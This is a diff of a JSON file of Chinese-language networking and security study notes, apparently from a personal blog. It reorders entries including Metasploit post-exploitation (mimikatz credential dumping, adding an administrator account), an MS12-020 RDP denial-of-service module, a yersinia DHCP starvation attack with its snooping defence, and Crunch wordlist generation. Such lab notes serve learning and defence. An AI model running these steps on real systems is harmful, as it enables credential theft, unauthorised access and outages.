@@ -36,13 +36,6 @@
     },
     {
         "updateDate" : "2025年5月18日",
-        "specificTtime" : "19点58分",
-        "title": "段寄存器和段式寻址",
-        "content" : "<h2>段寄存器和段式寻址</h2><p>段式寻址是一个从内存中访问内存地址的方式，该寻址方式诞生于intel推出 8086 CPU之后，因为8086有一个与众不同的地方：它有20条地址线，也就是20位宽，这意味着它可以访问2的20次方（1,048,576字节 = 1MB）的数据。但问题在于寄存器都是16位宽的，这意味着这些寄存器最大只能访问64KB字节的内存。</p><p>CPU将通过计算，将原本16位宽的内存通过左移4位以合成为20位宽，再加上偏移量（大多数情况下都为<code>0</code>），这样就可以访问的了20位宽的8086CPU可以访问的所有1MB内存。</p><p>段式寻址的作用不小，例如从磁盘读取系统内核到内存中，<code>0x10000</code>是内核常见的存放位置，如果不用段式寻址，将无法进行操作。除此之外，从磁盘读取数据、设置栈和其他需要访问的内存位置大于64kb的，都将用得上段式寻址。</p><p>为了实现这一效果，我们分别需要为段寄存器和段偏移量提供值，段寄存器的值应当是：我们要访问的内存位置除以16（后面将介绍为什么），段偏移量的值大多数情况下为0。</p><p>CPU遵循这个公式来算出我们要访问的内存地址：<code>将访问的内存地址 = 段寄存器的值 x 16 + 段偏移量</code>（即将16位宽内存位置左移4位合成为20位宽内存位置 + 段偏移量），你能看得到它会自己在段寄存器的值，也就是我们实际要访问的内存位置的基础上乘以16，这就是为什么我们提供给段寄存器的值，应当是我们要访问的内存位置再去除以16的原因。</p><p><strong>实现 / 设置段寄存器的值</strong></p><pre><code>mov ax, 实际要访问的内存地址 / 16    ; 设置要访问的内存地址<br>mov ds, ax                         ; 将值传给段寄存器</code></pre><p>顺带一提，不能直接将值赐予<code>ds</code>，必须中转。</p><p><strong>实现 / 设置段偏移量的值</strong></p><pre><code>mov si, 0x0000   ; 偏移量大多数情况下为0，因此赐予0x0000</code></pre><p><strong>实现 / 获取返回值</strong></p><pre><code>mov 寄存器, [si]      ; 寄存器具体是什么取决于目标内存位置的数据类型<br>mov 寄存器, [si + 1]  ; 也可以这样来获取下一个字段，以此类推</code></pre><p>结束。</p>",
-        "type" : 0
-    },
-    {
-        "updateDate" : "2025年5月18日",
         "specificTtime" : "20点00分",
         "title": "SSH Service",
         "content" : "<h2>systemctl开启ssh服务</h2><p>编辑<code>/etc/ssh/sshd_config</code></p><p>代码化line33，值改为yes<br>代码化line57，值改为yes</p><p>重启ssh服务</p><p>secureCRT选择ssh2模式连接kali，输入username和password即可</p><p>要传文件or下载文件，打开secureFX，sftp连接服务器ip即可</p>",
@@ -229,13 +222,6 @@
         "title": "端口镜像(1:1 and N:1)",
         "content" : "<h2>Port Mirroring：1:1 与 多:1 镜像配置</h2><p><strong>拓扑结构：</strong><br>PC1（10.0.0.2，网关 10.0.0.1）接入 RT1 左口，RT1 右口连接 RT2，RT2 下接交换机 SW1，SW1 接 PC2（10.1.0.10，网关 10.1.0.2）。<br>另有 PC3（10.2.0.2，网关 10.2.0.1）左接 RT1。</p><h3>一、1:1 端口镜像（单个源口 → 目标观察口）</h3><p><strong>应用场景：</strong>将 PC1 访问 PC2 的数据流镜像至 RT2 的接口供抓包。</p><pre><code>interface &lt;观察口&gt;<br>observe-port interface GigabitEthernet0/0/x</code></pre><p>指定 RT2 接口为观察口（接收镜像流量）</p><pre><code>interface &lt;镜像源口&gt;<br>mirror to observe-port both</code></pre><p>在 RT1 的 client 接口（PC1 所在口）设置镜像方向为 both（入出都镜像）<br>可选值：<br><code>inbound</code> - 仅镜像入方向流量<br><code>outbound</code> - 仅镜像出方向流量</p><p><strong>效果：</strong>Client ping Server，抓包 RT2 口可观察到 ICMP 流量</p><h3>二、多:1 端口镜像（多个源口 → 同一观察口）</h3><p><strong>拓扑扩展：</strong>RT1 增加左口连接 PC3（10.2.0.2），希望同时观察 PC1 和 PC3 的流量。</p><p>在观察口不变的情况下，对多个源接口配置镜像：</p><pre><code>interface GigabitEthernet0/0/x<br>mirror to observe-port both</code><br><pre><code>interface GigabitEthernet0/0/y<br>mirror to observe-port both</code></pre><p>这样多个口的流量可同时被镜像到观察口 RT2，用于统一抓包分析。</p>",
         "type" : 2
-    },
-    {
-        "updateDate" : "2025年5月18日",
-        "specificTtime" : "20点22分",
-        "title": "DHCP Snooping攻击与防范",
-        "content" : "<h2>Kali 伪造 DHCP Server 攻击与防范</h2><p><strong>实验目的：</strong>通过 Kali2019 虚拟机模拟非法 DHCP Server 干扰真实网络配置，并通过 DHCP Snooping 实现防御。</p><h3>一、合法 DHCP Server 配置</h3><p><strong>拓扑：</strong>三层路由器充当合法 DHCP Server，PC 设置为 DHCP 自动获取 IP</p><pre><code>dhcp enable<br>ip pool huawei<br>network 192.168.197.0<br>gateway-list 192.168.197.254</code></pre><p>进入下行接口配置 DHCP 功能：</p><pre><code>interface &lt;下行口&gt;<br>dhcp select global</code></pre><p>此时，PC 会正常通过合法 DHCP 获取地址</p><h3>二、Kali2019 发起攻击</h3><p>启动 Kali 虚拟机，将网卡设为 vmnet8，与云环境一致</p><pre><code>yersinia -G</code></pre><p>进入 GUI 后选择：<br><code>Launch attack → DHCP</code></p><ul><li><strong>Raw packet：</strong>发送任意自构报文</li><li><strong>Discover packet：</strong>模拟客户端获取地址</li><li><strong>DHCP rogue server：</strong>启动伪造 DHCP Server</li><li><strong>Release packet：</strong>向合法 DHCP Server 发送释放请求</li></ul><p>选择：<code>sending discover packet</code> 并确认，Kali 将发起大量请求导致 PC 无法获取 IP，Ping 网关失败，网络变慢。</p><h3>三、防范方法：DHCP Snooping</h3><p><strong>在二层交换机配置如下：</strong></p><pre><code>interface &lt;连接合法 PC 的端口&gt;<br>dhcp snooping enable</code></pre><pre><code>interface &lt;连接合法路由器的上行端口（trunk）&gt;<br>dhcp snooping trust</code></pre><p>说明：</p><ul><li>未标为 trusted 的端口收到 DHCP Server 报文将直接被丢弃</li><li>确保合法 DHCP Server 所在接口已配置 trusted</li></ul><p><strong>效果：</strong>非法 DHCP Server（如 Kali）即使尝试广播报文，也无法干扰正常设备获取 IP 地址。</p>",
-        "type" : 2
     }
     ,
     {
@@ -318,13 +304,6 @@
     {
         "updateDate" : "2025年5月18日",
         "specificTtime" : "20点22分",
-        "title": "渗透之后的信息采集工作",
-        "content" : "<h2>入侵后信息收集与持久化控制（Metasploit）</h2><h3>1. 基础信息收集</h3><pre><code>sysinfo</code></pre><p>查看目标系统版本、架构、主机名等基本信息。</p><h3>2. 获取用户凭据</h3><pre><code>load mimikatz</code></pre><p>加载 <code>mimikatz</code> 模块，用于凭证抓取。</p><pre><code>creds_all</code></pre><p>依赖 <code>mimikatz</code>，提取当前系统中缓存的用户名、密码、哈希等。</p><h3>3. 启用远程桌面</h3><pre><code>run getgui -e</code></pre><p>启用目标主机的远程桌面服务。</p><h3>4. 进入命令行与提权</h3><pre><code>shell</code></pre><p>切换到目标系统的 <code>cmd</code> 交互界面。</p><pre><code>chcp 65001</code></pre><p>设置终端编码为 UTF-8，防止中文乱码。</p><pre><code>net user &lt;username&gt; &lt;password&gt; /add</code></pre><p>新增一个本地用户。</p><pre><code>net localgroup administrators &lt;username&gt; /add</code></pre><p>将该用户添加至管理员组，完成本地提权。</p><h3>5. 远程桌面连接</h3><pre><code>rdesktop &lt;IP&gt;</code></pre><p>攻击端通过 <code>rdesktop</code> 工具远程连接至目标主机。</p>",
-        "type" : 3
-    },
-    {
-        "updateDate" : "2025年5月18日",
-        "specificTtime" : "20点22分",
         "title": "MS12_020 RDP拒绝服务攻击",
         "content" : "<h2>MS12-020 漏洞（Windows RDP 拒绝服务攻击）</h2><h3>🎯 漏洞信息</h3><ul><li><strong>漏洞编号：</strong>MS12-020</li><li><strong>针对服务：</strong>Windows 远程桌面服务（RDP）</li><li><strong>默认端口：</strong>3389</li><li><strong>攻击后果：</strong>目标主机直接蓝屏崩溃</li></ul><h3>🔎 漏洞侦测</h3><pre><code>use auxiliary/scanner/rdp/ms12_020_check<br>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p><strong>说明：</strong>该脚本用于<strong>检测</strong>目标是否存在 MS12-020 漏洞。若返回 <code>The target is vulnerable</code>，表示目标存在漏洞。</p><h3>💥 漏洞攻击</h3><pre><code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<br>set RHOSTS &lt;目标IP&gt;<br>exploit</code></pre><p>该脚本直接触发 RDP 拒绝服务漏洞，导致目标系统蓝屏。</p><h3>🛡️ 安全加固建议</h3><ol><li>客户端按下 <code>Win + R</code>，输入 <code>services.msc</code>，找到并停止 <strong>Remote Desktop Services</strong> 服务。</li><li>安装 Microsoft 提供的官方漏洞补丁，修复 MS12-020。</li></ol><p><strong>⚠️ 注意：</strong>此漏洞危害极大，建议立即加固已暴露至公网的 Windows RDP 服务。</p>",
         "type" : 3
@@ -363,5 +342,26 @@
         "title": "利用Crunch工具生成供密码破解的密码字典",
         "content" : "<h2>Crunch：密码字典生成工具</h2><p><strong>作用：</strong>基于给定字符集与长度生成所有可能组合的密码字典。</p><h3>🔢 基础排列组合</h3><pre><code>crunch &lt;min len&gt; &lt;max len&gt; &lt;string&gt;</code></pre><p>使用 <code>&lt;string&gt;</code> 中的字符生成从 <code>min len</code> 到 <code>max len</code> 所有可能的排列组合。例如：</p><pre><code>crunch 3 5 abc</code></pre><p>将生成由 a、b、c 构成，长度 3 到 5 的所有组合。</p><h3>🔧 模板组合（使用通配符）</h3><ul><li><code>&amp;</code>：替换为数字 0~9</li><li><code>@</code>：替换为小写字母 a~z</li><li><code>,</code>：替换为大写字母 A~Z</li><li><code>^</code>：替换为特殊字符（如 !@#$% 等）</li></ul><pre><code>crunch 4 4 -t @@12</code></pre><p>示例输出：aa12、ab12、ac12 …… 到 zz12。</p><pre><code>crunch 4 4 -t pass^^^^</code></pre><p>示例输出：pass!!!!、pass!\"#$ …… 等所有特殊字符组合。</p><h3>📦 输出到文件</h3><pre><code>crunch &lt;min len&gt; &lt;max len&gt; -o &lt;filename&gt;</code></pre><p>将生成的结果写入到指定文件中，例如：</p><pre><code>crunch 4 4 123abc -o mydict.txt</code></pre><h3>⚠️ 注意事项</h3><ul><li>过大的长度或字符集可能导致字典过大，占用大量内存和硬盘。</li><li>可搭配 <code>head</code>、<code>more</code> 命令预览字典。</li></ul>",
         "type" : 3
+    },
+    {
+        "updateDate" : "2025年5月18日",
+        "specificTtime" : "20点22分",
+        "title": "渗透之后的信息采集工作",
+        "content" : "<h2>入侵后信息收集与持久化控制（Metasploit）</h2><h3>1. 基础信息收集</h3><pre><code>sysinfo</code></pre><p>查看目标系统版本、架构、主机名等基本信息。</p><h3>2. 获取用户凭据</h3><pre><code>load mimikatz</code></pre><p>加载 <code>mimikatz</code> 模块，用于凭证抓取。</p><pre><code>creds_all</code></pre><p>依赖 <code>mimikatz</code>，提取当前系统中缓存的用户名、密码、哈希等。</p><h3>3. 启用远程桌面</h3><pre><code>run getgui -e</code></pre><p>启用目标主机的远程桌面服务。</p><h3>4. 进入命令行与提权</h3><pre><code>shell</code></pre><p>切换到目标系统的 <code>cmd</code> 交互界面。</p><pre><code>chcp 65001</code></pre><p>设置终端编码为 UTF-8，防止中文乱码。</p><pre><code>net user &lt;username&gt; &lt;password&gt; /add</code></pre><p>新增一个本地用户。</p><pre><code>net localgroup administrators &lt;username&gt; /add</code></pre><p>将该用户添加至管理员组，完成本地提权。</p><h3>5. 远程桌面连接</h3><pre><code>rdesktop &lt;IP&gt;</code></pre><p>攻击端通过 <code>rdesktop</code> 工具远程连接至目标主机。</p>",
+        "type" : 3
+    },
+    {
+        "updateDate" : "2025年5月18日",
+        "specificTtime" : "19点58分",
+        "title": "段寄存器和段式寻址",
+        "content" : "<h2>段寄存器和段式寻址</h2><p>段式寻址是一个从内存中访问内存地址的方式，该寻址方式诞生于intel推出 8086 CPU之后，因为8086有一个与众不同的地方：它有20条地址线，也就是20位宽，这意味着它可以访问2的20次方（1,048,576字节 = 1MB）的数据。但问题在于寄存器都是16位宽的，这意味着这些寄存器最大只能访问64KB字节的内存。</p><p>CPU将通过计算，将原本16位宽的内存通过左移4位以合成为20位宽，再加上偏移量（大多数情况下都为<code>0</code>），这样就可以访问的了20位宽的8086CPU可以访问的所有1MB内存。</p><p>段式寻址的作用不小，例如从磁盘读取系统内核到内存中，<code>0x10000</code>是内核常见的存放位置，如果不用段式寻址，将无法进行操作。除此之外，从磁盘读取数据、设置栈和其他需要访问的内存位置大于64kb的，都将用得上段式寻址。</p><p>为了实现这一效果，我们分别需要为段寄存器和段偏移量提供值，段寄存器的值应当是：我们要访问的内存位置除以16（后面将介绍为什么），段偏移量的值大多数情况下为0。</p><p>CPU遵循这个公式来算出我们要访问的内存地址：<code>将访问的内存地址 = 段寄存器的值 x 16 + 段偏移量</code>（即将16位宽内存位置左移4位合成为20位宽内存位置 + 段偏移量），你能看得到它会自己在段寄存器的值，也就是我们实际要访问的内存位置的基础上乘以16，这就是为什么我们提供给段寄存器的值，应当是我们要访问的内存位置再去除以16的原因。</p><p><strong>实现 / 设置段寄存器的值</strong></p><pre><code>mov ax, 实际要访问的内存地址 / 16    ; 设置要访问的内存地址<br>mov ds, ax                         ; 将值传给段寄存器</code></pre><p>顺带一提，不能直接将值赐予<code>ds</code>，必须中转。</p><p><strong>实现 / 设置段偏移量的值</strong></p><pre><code>mov si, 0x0000   ; 偏移量大多数情况下为0，因此赐予0x0000</code></pre><p><strong>实现 / 获取返回值</strong></p><pre><code>mov 寄存器, [si]      ; 寄存器具体是什么取决于目标内存位置的数据类型<br>mov 寄存器, [si + 1]  ; 也可以这样来获取下一个字段，以此类推</code></pre><p>结束。</p>",
+        "type" : 0
+    },
+    {
+        "updateDate" : "2025年5月18日",
+        "specificTtime" : "20点22分",
+        "title": "DHCP Snooping攻击与防范",
+        "content" : "<h2>Kali 伪造 DHCP Server 攻击与防范</h2><p><strong>实验目的：</strong>通过 Kali2019 虚拟机模拟非法 DHCP Server 干扰真实网络配置，并通过 DHCP Snooping 实现防御。</p><h3>一、合法 DHCP Server 配置</h3><p><strong>拓扑：</strong>三层路由器充当合法 DHCP Server，PC 设置为 DHCP 自动获取 IP</p><pre><code>dhcp enable<br>ip pool huawei<br>network 192.168.197.0<br>gateway-list 192.168.197.254</code></pre><p>进入下行接口配置 DHCP 功能：</p><pre><code>interface &lt;下行口&gt;<br>dhcp select global</code></pre><p>此时，PC 会正常通过合法 DHCP 获取地址</p><h3>二、Kali2019 发起攻击</h3><p>启动 Kali 虚拟机，将网卡设为 vmnet8，与云环境一致</p><pre><code>yersinia -G</code></pre><p>进入 GUI 后选择：<br><code>Launch attack → DHCP</code></p><ul><li><strong>Raw packet：</strong>发送任意自构报文</li><li><strong>Discover packet：</strong>模拟客户端获取地址</li><li><strong>DHCP rogue server：</strong>启动伪造 DHCP Server</li><li><strong>Release packet：</strong>向合法 DHCP Server 发送释放请求</li></ul><p>选择：<code>sending discover packet</code> 并确认，Kali 将发起大量请求导致 PC 无法获取 IP，Ping 网关失败，网络变慢。</p><h3>三、防范方法：DHCP Snooping</h3><p><strong>在二层交换机配置如下：</strong></p><pre><code>interface &lt;连接合法 PC 的端口&gt;<br>dhcp snooping enable</code></pre><pre><code>interface &lt;连接合法路由器的上行端口（trunk）&gt;<br>dhcp snooping trust</code></pre><p>说明：</p><ul><li>未标为 trusted 的端口收到 DHCP Server 报文将直接被丢弃</li><li>确保合法 DHCP Server 所在接口已配置 trusted</li></ul><p><strong>效果：</strong>非法 DHCP Server（如 Kali）即使尝试广播报文，也无法干扰正常设备获取 IP 地址。</p>",
+        "type" : 2
     }
 ]
